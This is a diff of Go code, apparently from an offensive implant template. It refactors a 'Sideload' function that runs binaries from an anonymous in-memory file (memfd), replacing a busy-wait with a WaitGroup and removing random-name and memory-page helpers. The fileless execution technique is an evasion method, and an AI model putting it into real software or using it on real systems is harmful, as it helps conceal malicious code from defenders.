@@ -22,12 +22,11 @@ import (
 	"bytes"
 	"fmt"
 	"io/ioutil"
-	insecureRand "math/rand"
 	"os"
 	"os/exec"
 	"runtime"
+	"sync"
 	"syscall"
-	"time"
 	"unsafe"
 
 	//{{if .Debug}}
@@ -62,6 +61,7 @@ func Sideload(procName string, data []byte, args string) (string, error) {
 		nrMemfdCreate int
 		stdOut        bytes.Buffer
 		stdErr        bytes.Buffer
+		wg            sync.WaitGroup
 	)
 	memfdName := randomString(8)
 	memfd, err := syscall.BytePtrFromString(memfdName)
@@ -101,13 +101,10 @@ func Sideload(procName string, data []byte, args string) (string, error) {
 	//{{if .Debug}}
 	log.Printf("Starging %s\n", cmd.String())
 	//{{end}}
-	go startAndWait(cmd)
+	wg.Add(1)
+	go startAndWait(cmd, &wg)
 	// Wait for process to terminate
-	for {
-		if cmd.ProcessState != nil {
-			break
-		}
-	}
+	wg.Wait()
 	if len(stdErr.Bytes()) > 0 {
 		return "", fmt.Errorf(stdErr.String())
 	}
@@ -116,31 +113,4 @@ func Sideload(procName string, data []byte, args string) (string, error) {
 	log.Printf("Done, stderr: %s\n", stdErr.String())
 	//{{end}}
 	return stdOut.String(), nil
-}
-
-func startAndWait(cmd *exec.Cmd) {
-	cmd.Start()
-	cmd.Wait()
-}
-
-// Utility functions
-
-func stringWithCharset(length int, charset string) string {
-	seededRand := insecureRand.New(insecureRand.NewSource(time.Now().UnixNano()))
-	b := make([]byte, length)
-	for i := range b {
-		b[i] = charset[seededRand.Intn(len(charset))]
-	}
-	return string(b)
-}
-
-func randomString(length int) string {
-	charset := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	return stringWithCharset(length, charset)
-}
-
-// Get the page containing the given pointer
-// as a byte slice.
-func getPage(p uintptr) []byte {
-	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
 }
